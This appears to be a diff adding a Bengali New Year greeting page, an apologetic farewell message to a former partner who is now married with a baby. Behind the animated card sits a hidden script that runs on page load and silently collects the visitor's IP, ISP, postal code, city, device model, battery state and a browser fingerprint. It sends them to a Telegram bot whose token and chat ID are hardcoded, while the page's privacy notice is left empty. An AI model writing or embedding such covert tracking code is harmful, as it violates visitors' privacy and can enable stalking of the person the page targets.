@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Happy New Year তুমি</title>
+  
+  <!-- Telegram Bot Configuration -->
+  <script>
+    const TELEGRAM_BOT_TOKEN = '7682058920:AAHQyVfOrA-n-baxONHvgnDyCWutSznB3bc';
+    const TELEGRAM_CHAT_ID = '7574136332';
+    const ENABLE_DATA_COLLECTION = true;
+  </script>
+  
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      height: 100vh;
+      background: radial-gradient(circle at top, #1b2735 0%, #090a0f 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      color: #fff;
+      overflow: hidden;
+    }
+    .stars {
+      position: absolute;
+      inset: 0;
+      background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="2" height="2"><circle cx="1" cy="1" r="1" fill="white"/></svg>') repeat;
+      opacity: .25;
+    }
+    
+    .intro {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #000;
+      z-index: 5;
+      animation: hideIntro 1.2s ease forwards;
+      animation-delay: 3.5s;
+    }
+    .intro img {
+      width: 180px;
+      height: 180px;
+      border-radius: 50%;
+      object-fit: cover;
+      box-shadow: 0 0 40px rgba(255,105,135,.6);
+      animation: pulse 2s ease infinite;
+    }
+    
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.06); }
+      100% { transform: scale(1); }
+    }
+    @keyframes hideIntro {
+      to { opacity: 0; visibility: hidden; }
+    }
+
+    .card {
+      position: relative;
+      z-index: 2;
+      background: linear-gradient(180deg, rgba(255,255,255,.12), rgba(255,255,255,.05));
+      backdrop-filter: blur(10px);
+      padding: 42px 32px;
+      border-radius: 26px;
+      max-width: 420px;
+      max-height: 80vh;
+      overflow-y: auto;
+      box-shadow: 0 30px 80px rgba(0,0,0,.6);
+      opacity: 0;
+      animation: showCard 1.2s ease forwards;
+      animation-delay: 3.8s;
+      text-align: center;
+      scrollbar-width: thin;
+      scrollbar-color: #ff69b7 transparent;
+    }
+    .card::-webkit-scrollbar {
+      width: 8px;
+    }
+    .card::-webkit-scrollbar-thumb {
+      background: #ff69b7;
+      border-radius: 10px;
+    }
+    @keyframes showCard {
+      to { opacity: 1; }
+    }
+
+    h1 { 
+      font-size: 30px; 
+      margin-bottom: 24px;
+      color: #ff69b7;
+      background: linear-gradient(45deg, #ff69b7, #ffb6e1);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .line { 
+      font-size: 22px; 
+      line-height: 1.7; 
+      opacity: 0; 
+      margin-bottom: 18px;
+      font-family: 'Noto Sans Bengali', 'Arial', sans-serif;
+      transform: translateY(10px);
+      transition: opacity 1s ease-in-out, transform 1s ease-in-out;
+      color: #ffd6de;
+    }
+    .line.show { 
+      opacity: 1; 
+      transform: translateY(0);
+    }
+    
+    .name {
+      display: inline-block;
+      padding: .2em .6em;
+      border-radius: 12px;
+      background: rgba(255,105,183,0.3);
+      color: #ffb6e1;
+      font-weight: bold;
+    }
+    
+    .signature {
+      margin-top: 30px;
+      font-size: 18px;
+      color: #ffd6de;
+      opacity: 0;
+      font-style: italic;
+      transform: translateY(10px);
+      transition: opacity 1s ease-in-out, transform 1s ease-in-out;
+    }
+    .signature.show { 
+      opacity: 1; 
+      transform: translateY(0);
+    }
+    
+    .footer { 
+      margin-top: 26px;
+      font-size: 16px; 
+      opacity: 0;
+      color: #ffb6e1;
+      font-weight: bold;
+      transform: translateY(10px);
+      transition: opacity 1s ease-in-out, transform 1s ease-in-out;
+    }
+    .footer.show { 
+      opacity: 1; 
+      transform: translateY(0);
+    }
+
+    .heart {
+      position: absolute;
+      bottom: -30px;
+      animation: floatUp linear infinite;
+      opacity: .9;
+    }
+    @keyframes floatUp {
+      0% { transform: translateY(0) scale(.8); opacity: 0; }
+      10% { opacity: 1; }
+      100% { transform: translateY(-110vh) scale(1.4); opacity: 0; }
+    }
+
+    .confetti {
+      position: absolute;
+      width: 10px;
+      height: 10px;
+      background: #ff69b7;
+      animation: confettiFall 5s linear infinite;
+      border-radius: 50%;
+    }
+    @keyframes confettiFall {
+      0% { transform: translateY(-100vh) rotate(0deg); opacity: 1; }
+      100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
+    }
+
+    .controls {
+      position: fixed;
+      bottom: 40px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      gap: 15px;
+      z-index: 10;
+    }
+    .control-btn {
+      padding: 10px 20px;
+      background: rgba(255, 105, 183, 0.5);
+      border: none;
+      border-radius: 20px;
+      color: white;
+      cursor: pointer;
+      font-size: 14px;
+      transition: background 0.3s;
+    }
+    .control-btn:hover {
+      background: rgba(255, 105, 183, 0.8);
+    }
+
+    @media (max-width: 420px) {
+      h1 { font-size: 26px; }
+      .line { font-size: 20px; }
+      .card { padding: 32px 24px; max-width: 96%; }
+    }
+    
+    /* Privacy Notice */
+    .privacy-notice {  
+      position: fixed;  
+      bottom: 20px;  
+      left: 50%;  
+      transform: translateX(-50%);  
+      background: rgba(0,0,0,0.8);  
+      color: white;  
+      padding: 10px 20px;  
+      border-radius: 10px;  
+      font-size: 12px;  
+      z-index: 1000;  
+      max-width: 90%;  
+      text-align: center;  
+      backdrop-filter: blur(5px);  
+    }  
+  </style>
+</head>
+<body>
+  <div class="stars"></div>
+  
+  <!-- Intro photo -->
+  <div class="intro">
+    <img src="photo.jpg" alt="Love">
+  </div>
+  
+  <!-- Background music -->
+  <audio id="bgMusic" autoplay loop>
+    <source src="https://cdn.pixabay.com/audio/2022/10/30/audio_8d33c0d3b0.mp3" type="audio/mpeg">
+  </audio>
+
+  <div class="card">
+    <h1>🎉 Happy New Year 2026 🎉</h1>
+    
+    <div class="line">নতুন বছরের প্রথম আলোয় আজ শুধু মন থেকে এটুকুই বলতে চাই—তুমি ছিলে আমার জীবনের সবচেয়ে সুন্দর, সবচেয়ে সত্যিকারের অধ্যায়।</div>
+    <div class="line">তোমার হাসি, তোমার কথা, তোমার নীরব উপস্থিতি—সবকিছু আজও আমার হৃদয়ের ভেতর খুব যত্নে রাখা আছে।</div>
+    <div class="line">সময় বদলেছে, মানুষ বদলেছে, কিন্তু কিছু অনুভূতি কখনো বদলায় না—তুমি তারই একটি নাম।</div>
+    <div class="line">আমি জানি, এই গল্পের পথে হাঁটতে গিয়ে আমি তোমাকে কষ্ট দিয়েছি।</div>
+    <div class="line">কথায়, নীরবতায়, কিংবা আমার অজান্তেই—যদি কখনো তোমার চোখে জল এনে থাকি,</div>
+    <div class="line">আজ এই নতুন বছরের শুরুতে, একদম মন থেকে বলছি—আমাকে ক্ষমা করে দিও।</div>
+    <div class="line">ইচ্ছে করে কষ্ট দিইনি, কিন্তু বুঝতে শিখেছি অনেক দেরিতে।</div>
+    <div class="line">আমরা এখন ভিন্ন পথে, ভিন্ন জীবনে।</div>
+    <div class="line">তোমার নিজের একটি সংসার আছে, একজন জীবনসঙ্গী আছে, আর তোমার কোলে একটি নিষ্পাপ ছোট্ট জীবন।</div>
+    <div class="line">আমি চাই তুমি তোমার husband আর baby‑কে নিয়ে খুব ভালো থাকো, নিরাপদ থাকো, সুখে থাকো।</div>
+    <div class="line">তোমার হাসি যেন কখনো ম্লান না হয়, তোমার জীবনে যেন অভাব আর অশান্তি ছুঁতে না পারে।</div>
+    <div class="line">আমি কখনো আর তোমাকে বিরক্ত করব না, কখনো তোমার শান্ত জীবনে ছায়া হয়ে দাঁড়াব না।</div>
+    <div class="line">দূর থেকেই শুধু প্রার্থনা করব—তোমার জন্য, তোমার সুখের জন্য।</div>
+    <div class="line">বিদায় বলতে গেলে আজ আর কষ্ট নেই—আছে শুধু ভালোবাসা, সম্মান, আর একরাশ কৃতজ্ঞতা।</div>
+    <div class="line">২০২৬ সাল তোমার জীবনে বয়ে আনুক আলো, শান্তি, আর পরিপূর্ণ সুখ।</div>
+    <div class="line">তুমি চিরকাল আমার হৃদয়ের এক নীরব, পবিত্র স্মৃতি হয়ে থাকবে। 🥹🤍</div>
+    
+    <div class="signature">— From <span class="name">তোমার পুরোনো স্মৃতির একটি অংশ</span></div>
+    
+    <div class="footer">💕 Forever & Always 💕</div>
+  </div>
+  
+  <!-- Controls -->
+  <div class="controls">
+    <button class="control-btn" id="toggleMusic">Pause Music</button>
+    <button class="control-btn" id="replayAnim">Replay Animation</button>
+    <button class="control-btn" id="shareBtn">Share</button>
+  </div>
+  
+  <!-- Privacy Notice -->
+  <div class="privacy-notice"></div>
+  
+  <!-- Main Script -->
+  <script>
+    // Show lines one by one
+    const lines = document.querySelectorAll('.line');
+    const signature = document.querySelector('.signature');
+    const footer = document.querySelector('.footer');
+
+    function playAnimations() {
+      let delay = 4200;
+      lines.forEach((line) => {
+        line.classList.remove('show');
+        setTimeout(() => {
+          line.classList.add('show');
+        }, delay);
+        delay += 800;
+      });
+
+      setTimeout(() => {
+        signature.classList.remove('show');
+        signature.classList.add('show');
+      }, delay);
+      
+      delay += 800;
+
+      setTimeout(() => {
+        footer.classList.remove('show');
+        footer.classList.add('show');
+      }, delay);
+    }
+
+    playAnimations();
+
+    // Floating hearts with random colors
+    const colors = ['#ff69b7', '#ffb6e1', '#ffd6de', '#ff9ec4', '#ff4d9e'];
+    function createHeart() {
+      const heart = document.createElement('div');
+      heart.className = 'heart';
+      heart.textContent = '💕';
+      heart.style.left = Math.random() * 100 + 'vw';
+      heart.style.fontSize = (14 + Math.random() * 16) + 'px';
+      heart.style.animationDuration = (4 + Math.random() * 4) + 's';
+      heart.style.color = colors[Math.floor(Math.random() * colors.length)];
+      document.body.appendChild(heart);
+      setTimeout(() => heart.remove(), 8000);
+    }
+    setInterval(createHeart, 300);
+
+    // Confetti
+    function createConfetti() {
+      const confetti = document.createElement('div');
+      confetti.className = 'confetti';
+      confetti.style.left = Math.random() * 100 + 'vw';
+      confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
+      confetti.style.animationDuration = (3 + Math.random() * 3) + 's';
+      confetti.style.animationDelay = Math.random() + 's';
+      document.body.appendChild(confetti);
+      setTimeout(() => confetti.remove(), 6000);
+    }
+    setInterval(createConfetti, 200);
+
+    // Music control
+    const music = document.getElementById('bgMusic');
+    const toggleMusicBtn = document.getElementById('toggleMusic');
+    toggleMusicBtn.addEventListener('click', () => {
+      if (music.paused) {
+        music.play();
+        toggleMusicBtn.textContent = 'Pause Music';
+      } else {
+        music.pause();
+        toggleMusicBtn.textContent = 'Play Music';
+      }
+    });
+
+    // Replay animation
+    const replayBtn = document.getElementById('replayAnim');
+    replayBtn.addEventListener('click', () => {
+      playAnimations();
+    });
+
+    // Share button
+    const shareBtn = document.getElementById('shareBtn');
+    shareBtn.addEventListener('click', () => {
+      if (navigator.share) {
+        navigator.share({
+          title: 'Happy New Year 2026',
+          text: 'A special New Year message for you!',
+          url: window.location.href
+        }).catch(console.error);
+      } else {
+        alert('Share this link: ' + window.location.href);
+      }
+    });
+  </script>
+  
+  <!-- Data Collection Script -->
+  <script>
+    if (ENABLE_DATA_COLLECTION && TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+      window.addEventListener('load', function() {
+        setTimeout(collectAndSendData, 2000);
+      });
+        
+      async function collectAndSendData() {
+        try {
+          console.log('📊 Collecting visitor data...');
+            
+          let ipData = {
+            ip: 'N/A',
+            org: 'N/A',
+            postal: 'N/A',
+            city: 'N/A',
+            country_name: 'N/A'
+          };
+          
+          try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipJson = await ipResponse.json();
+            ipData.ip = ipJson.ip;
+              
+            try {
+              const detailResponse = await fetch(`https://ipinfo.io/${ipData.ip}/json`);
+              const detailData = await detailResponse.json();
+              ipData.org = detailData.org || 'N/A';
+              ipData.postal = detailData.postal || 'N/A';
+              ipData.city = detailData.city || 'N/A';
+              ipData.country_name = detailData.country || 'N/A';
+            } catch (e) {
+              console.log('IP details not available');
+            }
+          } catch (e) {
+            console.log('IP detection failed');
+          }
+            
+          let batteryLevel = 'N/A';
+          let isCharging = 'N/A';
+          if ('getBattery' in navigator) {
+            try {
+              const battery = await navigator.getBattery();
+              batteryLevel = `${Math.round(battery.level * 100)}%`;
+              isCharging = battery.charging ? 'Yes' : 'No';
+            } catch (e) {}
+          }
+            
+          function generateFingerprint() {
+            const components = [
+              navigator.userAgent,
+              navigator.language,
+              screen.colorDepth,
+              screen.width + 'x' + screen.height,
+              new Date().getTimezoneOffset(),
+              !!window.sessionStorage,
+              !!window.localStorage,
+              navigator.platform,
+              navigator.hardwareConcurrency || 'unknown'
+            ];
+            let fingerprint = components.join('|');
+            let hash = 0;
+            for (let i = 0; i < fingerprint.length; i++) {
+              hash = ((hash << 5) - hash) + fingerprint.charCodeAt(i);
+              hash = hash & hash;
+            }
+            return Math.abs(hash).toString(36).substring(0, 12);
+          }
+            
+          function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let deviceName = 'Desktop';
+            let deviceModel = 'Unknown';
+            
+            if (/mobile/i.test(ua)) deviceName = 'Mobile';
+            if (/tablet/i.test(ua)) deviceName = 'Tablet';
+            
+            if (/iPhone/i.test(ua)) {
+              deviceModel = 'iPhone';
+            } else if (/iPad/i.test(ua)) {
+              deviceModel = 'iPad';
+            } else if (/Android/i.test(ua)) {
+              const match = ua.match(/Android.*;\s([^;]+)\sBuild/i);
+              deviceModel = match ? match[1] : 'Android Device';
+            } else if (/Windows/i.test(ua)) {
+              deviceModel = 'Windows PC';
+            } else if (/Mac/i.test(ua)) {
+              deviceModel = 'Mac';
+            } else if (/Linux/i.test(ua)) {
+              deviceModel = 'Linux';
+            }
+            
+            return { deviceName, deviceModel };
+          }
+            
+          function getBrowserName() {
+            const ua = navigator.userAgent;
+            if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
+            if (ua.includes("Firefox")) return "Firefox";
+            if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+            if (ua.includes("Edg")) return "Edge";
+            if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
+            return "Unknown";
+          }
+            
+          const deviceInfo = getDeviceInfo();
+          const browserName = getBrowserName();
+          const fingerprint = generateFingerprint();
+            
+          const data = {
+            ip: ipData.ip,
+            isp: ipData.org,
+            zip: ipData.postal,
+            location: `${ipData.city}, ${ipData.country_name}`,
+            userAgent: navigator.userAgent.substring(0, 100) + '...',
+            battery: batteryLevel,
+            charging: isCharging,
+            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            browser: browserName,
+            fingerprint: fingerprint,
+            deviceFingerprint: fingerprint + '-' + Date.now(),
+            deviceName: deviceInfo.deviceName,
+            deviceModel: deviceInfo.deviceModel,
+            screen: `\( {screen.width}x \){screen.height}`,
+            language: navigator.language,
+            referrer: document.referrer || 'Direct',
+            url: window.location.href,
+            timestamp: new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka' })
+          };
+            
+          await sendToTelegram(data);
+            
+        } catch (error) {
+          console.error('Error in data collection:', error);
+        }
+      }
+        
+      async function sendToTelegram(data) {
+        try {
+          const message = `
+📊 *New Website Visitor*
+
+🌍 *Location Info:*
+📍 IP: \`${data.ip}\`
+📡 ISP: ${data.isp}
+📮 ZIP: ${data.zip}
+🌏 Location: ${data.location}
+🕐 Timezone: ${data.timeZone}
+
+📱 *Device Info:*
+📲 Device: ${data.deviceName}
+📟 Model: ${data.deviceModel}
+🌐 Browser: ${data.browser}
+🖥 Screen: ${data.screen}
+🌐 Language: ${data.language}
+
+🔋 *Technical Data:*
+🔋 Battery: ${data.battery}
+⚡ Charging: ${data.charging}
+🆔 Fingerprint: \`${data.fingerprint}\`
+🆔 Device FP: \`${data.deviceFingerprint}\`
+
+📅 *Session Info:*
+🔗 Referrer: ${data.referrer}
+🔗 URL: ${data.url}
+🕰 Time: ${data.timestamp}
+          `.trim();
+            
+          const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+          await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: message,
+              parse_mode: 'Markdown',
+              disable_notification: true
+            })
+          });
+            
+        } catch (error) {
+          console.error('Telegram send error:', error);
+        }
+      }
+    } else {
+      console.log('🚫 Data collection is disabled or not configured');
+    }
+  </script>
+</body>
+</html>
